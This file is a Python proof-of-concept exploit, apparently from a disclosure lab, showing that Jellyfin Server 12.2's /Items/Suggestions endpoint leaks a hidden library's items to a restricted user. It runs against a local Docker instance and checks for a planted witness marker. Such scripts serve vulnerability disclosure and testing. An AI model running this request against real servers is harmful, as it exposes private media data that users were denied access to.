#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: jellyfin-suggestions-idor (High: 6.5)
#  Vendor: Jellyfin Server (Jellyfin)
#  Versions: Jellyfin Server 12.2 (ca0f16eb)
#  Impact: omit userId on GET /Items/Suggestions dumps hidden library Path and IDs
#  Requires: Docker, jellyfin/jellyfin:12.2, loopback 127.0.0.1:18790
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "jellyfin-suggestions-idor"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Jellyfin 12.2 GET /Items/Suggestions omit-userId dumps a hidden library."""

import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from http.client import HTTPMessage
from typing import Any

LABEL = "jellyfin-suggestions-idor"
WITNESS = "JELLYFIN-SUGGESTIONS-IDOR-WITNESS"
HOST = "127.0.0.1"
PORT = 18790
BASE = f"http://{HOST}:{PORT}"
IMAGE = os.environ.get("JELLYFIN_IMAGE", "jellyfin/jellyfin:12.2")
ADMIN_NAME = "labadmin"
ADMIN_PASSWORD = "LabAdmin1!"
USER_NAME = "labuser"
USER_PASSWORD = "LabUser1!"
ADMIN_DEVICE = "lab-sug-idor"
USER_DEVICE = "lab-sug-idor-b"
CLIENT_VERSION = "12.2.0"
PRIVATE_LIBRARY = "PrivateA"
PUBLIC_LIBRARY = "PublicB"


@dataclass(frozen=True)
class HttpResponse:
    status: int
    url: str
    headers: HTTPMessage
    body: bytes

    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")

    def json(self) -> Any:
        raw = self.text()
        if not raw.strip():
            return None
        return json.loads(raw)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def sanitize(text: str) -> str:
    return text.replace("\n", " ").replace("\r", " ")[:240]


def pick(obj: Any, *names: str) -> Any:
    if not isinstance(obj, dict):
        return None
    lowered = {str(key).lower(): value for key, value in obj.items()}
    for name in names:
        if name.lower() in lowered:
            return lowered[name.lower()]
    return None


def pascal_keys(obj: Any) -> Any:
    if isinstance(obj, dict):
        out: dict[str, Any] = {}
        for key, value in obj.items():
            new_key = key[:1].upper() + key[1:] if key else key
            out[new_key] = pascal_keys(value)
        return out
    if isinstance(obj, list):
        return [pascal_keys(item) for item in obj]
    return obj


def auth_header(device_id: str, token: str | None = None) -> str:
    header = (
        f'MediaBrowser Client="lab", Device="lab", DeviceId="{device_id}", '
        f'Version="{CLIENT_VERSION}"'
    )
    if token:
        header = f'{header}, Token="{token}"'
    return header


def request(
    method: str,
    path: str,
    *,
    token: str | None = None,
    device_id: str = ADMIN_DEVICE,
    payload: Any | None = None,
    raw: bytes | None = None,
    timeout: int = 60,
    query: dict[str, str] | None = None,
) -> HttpResponse:
    url = path if path.startswith("http") else f"{BASE}{path}"
    if query:
        url = f"{url}?{urllib.parse.urlencode(query)}"
    headers = {
        "Accept": 'application/json; profile="PascalCase"',
        "Authorization": auth_header(device_id, token),
    }
    data = raw
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return HttpResponse(resp.status, resp.geturl(), resp.headers, resp.read())
    except urllib.error.HTTPError as exc:
        return HttpResponse(exc.code, url, exc.headers, exc.read())


def wait_ready() -> bool:
    for attempt in range(1, 121):
        try:
            resp = request("GET", "/Startup/User", timeout=8)
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            log(f"IOC wait-startup-user attempt={attempt} err={exc}")
            time.sleep(2)
            continue
        text = resp.text().lstrip("\ufeff").strip()
        if resp.status == 200 and text.startswith("{"):
            log(f"IOC wait-startup-user attempt={attempt} http=200")
            return True
        log(f"IOC wait-startup-user attempt={attempt} http={resp.status}")
        time.sleep(2)
    return False


def authenticate(username: str, password: str, device_id: str) -> tuple[str, str]:
    resp = request(
        "POST",
        "/Users/AuthenticateByName",
        device_id=device_id,
        payload={"Username": username, "Pw": password},
    )
    log(f"IOC auth user={username} http={resp.status}")
    if resp.status != 200:
        raise RuntimeError(f"auth http={resp.status} body={sanitize(resp.text())}")
    body = resp.json()
    token = pick(body, "AccessToken")
    user = pick(body, "User") or {}
    user_id = pick(user, "Id")
    if not token or not user_id:
        raise RuntimeError(f"auth-missing-token body={sanitize(resp.text())}")
    return str(token), str(user_id)


def body_has_witness(text: str) -> bool:
    return WITNESS in text


def setup_wizard() -> None:
    first = request("GET", "/Startup/User")
    log(f"IOC startup-user-get http={first.status}")
    if first.status not in (200, 204):
        raise RuntimeError(f"startup-user-get http={first.status} body={sanitize(first.text())}")

    posted = request(
        "POST",
        "/Startup/User",
        payload={"Name": ADMIN_NAME, "Password": ADMIN_PASSWORD},
    )
    log(f"IOC startup-user-post http={posted.status}")
    if posted.status not in (200, 204):
        raise RuntimeError(f"startup-user-post http={posted.status} body={sanitize(posted.text())}")

    remote = request(
        "POST",
        "/Startup/RemoteAccess",
        payload={"EnableRemoteAccess": True, "EnableAutomaticPortMapping": False},
    )
    log(f"IOC startup-remote http={remote.status}")
    if remote.status not in (200, 204):
        raise RuntimeError(f"startup-remote http={remote.status} body={sanitize(remote.text())}")

    private = request(
        "POST",
        "/Library/VirtualFolders",
        query={
            "name": PRIVATE_LIBRARY,
            "collectionType": "movies",
            "paths": "/media/private-a",
            "refreshLibrary": "true",
        },
        payload={},
        timeout=180,
    )
    log(f"IOC add-folder {PRIVATE_LIBRARY} http={private.status}")
    if private.status not in (200, 204):
        raise RuntimeError(
            f"add-folder-{PRIVATE_LIBRARY} http={private.status} body={sanitize(private.text())}"
        )

    public = request(
        "POST",
        "/Library/VirtualFolders",
        query={
            "name": PUBLIC_LIBRARY,
            "collectionType": "movies",
            "paths": "/media/public-b",
            "refreshLibrary": "true",
        },
        payload={},
        timeout=180,
    )
    log(f"IOC add-folder {PUBLIC_LIBRARY} http={public.status}")
    if public.status not in (200, 204):
        raise RuntimeError(
            f"add-folder-{PUBLIC_LIBRARY} http={public.status} body={sanitize(public.text())}"
        )

    complete = request("POST", "/Startup/Complete", payload={})
    log(f"IOC startup-complete http={complete.status}")
    if complete.status not in (200, 204):
        raise RuntimeError(
            f"startup-complete http={complete.status} body={sanitize(complete.text())}"
        )


def public_folder_id(token: str) -> str:
    resp = request("GET", "/Library/VirtualFolders", token=token)
    log(f"IOC virtual-folders http={resp.status}")
    if resp.status != 200:
        raise RuntimeError(f"virtual-folders http={resp.status} body={sanitize(resp.text())}")
    folders = resp.json()
    if not isinstance(folders, list):
        raise RuntimeError(f"virtual-folders-shape body={sanitize(resp.text())}")
    for folder in folders:
        name = pick(folder, "Name")
        item_id = pick(folder, "ItemId")
        log(f"IOC folder name={name} itemId={item_id}")
        if name == PUBLIC_LIBRARY and item_id:
            return str(item_id)
    raise RuntimeError(f"public-folder-missing body={sanitize(resp.text())}")


def create_restricted_user(admin_token: str, public_item_id: str) -> str:
    created = request(
        "POST",
        "/Users/New",
        token=admin_token,
        payload={"Name": USER_NAME, "Password": USER_PASSWORD},
    )
    log(f"IOC users-new http={created.status}")
    if created.status not in (200, 201):
        raise RuntimeError(f"users-new http={created.status} body={sanitize(created.text())}")
    user_id = pick(created.json(), "Id")
    if not user_id:
        raise RuntimeError(f"users-new-id-missing body={sanitize(created.text())}")

    fetched = request("GET", f"/Users/{user_id}", token=admin_token)
    log(f"IOC users-get http={fetched.status}")
    if fetched.status != 200:
        raise RuntimeError(f"users-get http={fetched.status} body={sanitize(fetched.text())}")
    policy = pick(fetched.json(), "Policy")
    if not isinstance(policy, dict):
        raise RuntimeError("user-policy-missing")
    policy = pascal_keys(policy)
    policy["EnableAllFolders"] = False
    policy["EnabledFolders"] = [public_item_id]
    policy["IsAdministrator"] = False

    updated = request(
        "POST",
        f"/Users/{user_id}/Policy",
        token=admin_token,
        payload=policy,
    )
    log(f"IOC users-policy http={updated.status}")
    if updated.status not in (200, 204):
        raise RuntimeError(
            f"users-policy http={updated.status} body={sanitize(updated.text())}"
        )
    return str(user_id)


def wait_for_witness(admin_token: str) -> bool:
    request("POST", "/Library/Refresh", token=admin_token, payload={}, timeout=180)
    for attempt in range(1, 61):
        resp = request(
            "GET",
            "/Items",
            token=admin_token,
            query={"Recursive": "true", "Fields": "Path,Name"},
            timeout=60,
        )
        has = body_has_witness(resp.text())
        log(f"IOC admin-items attempt={attempt} http={resp.status} witness={int(has)}")
        if resp.status == 200 and has:
            return True
        if attempt in (10, 20, 35):
            request("POST", "/Library/Refresh", token=admin_token, payload={}, timeout=180)
        time.sleep(3)
    return False


def main() -> int:
    log(f"IOC image={IMAGE} base={BASE} compose={os.environ.get('COMPOSE_PROJECT_NAME', LABEL)}")
    if not wait_ready():
        return fail("jellyfin-not-ready")

    try:
        setup_wizard()
        admin_token, admin_id = authenticate(ADMIN_NAME, ADMIN_PASSWORD, ADMIN_DEVICE)
        log(f"IOC admin-id={admin_id}")
        public_id = public_folder_id(admin_token)
        user_id = create_restricted_user(admin_token, public_id)
        log(f"IOC user-id={user_id} public-folder={public_id}")
        if not wait_for_witness(admin_token):
            return fail("library-scan-missing-witness")
        user_token, _ = authenticate(USER_NAME, USER_PASSWORD, USER_DEVICE)
    except (RuntimeError, json.JSONDecodeError, urllib.error.URLError, TimeoutError, OSError) as exc:
        return fail(f"setup:{exc}")

    items = request(
        "GET",
        "/Items",
        token=user_token,
        device_id=USER_DEVICE,
        query={"Recursive": "true", "Fields": "Path,Name"},
    )
    items_has = body_has_witness(items.text())
    log(f"IOC user-items http={items.status} witness={int(items_has)}")
    if items.status != 200:
        return fail(f"user-items http={items.status} body={sanitize(items.text())}")
    if items_has:
        return fail("items-leaked-witness")

    suggestions = request(
        "GET",
        "/Items/Suggestions",
        token=user_token,
        device_id=USER_DEVICE,
    )
    suggestions_has = body_has_witness(suggestions.text())
    log(
        f"IOC user-suggestions http={suggestions.status} witness={int(suggestions_has)} "
        f"body={sanitize(suggestions.text())}"
    )
    if suggestions.status != 200:
        return fail(
            f"suggestions http={suggestions.status} body={sanitize(suggestions.text())}"
        )
    if not suggestions_has:
        return fail("suggestions-missing-witness")

    impersonate = request(
        "GET",
        "/Items/Suggestions",
        token=user_token,
        device_id=USER_DEVICE,
        query={"userId": admin_id},
    )
    log(f"IOC impersonate-suggestions http={impersonate.status}")
    if impersonate.status != 403:
        return fail(
            f"impersonate http={impersonate.status} body={sanitize(impersonate.text())}"
        )

    log(
        f"SUCCESS {LABEL} items-hidden=yes suggestions-has-witness=yes "
        f"impersonate-403=yes {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

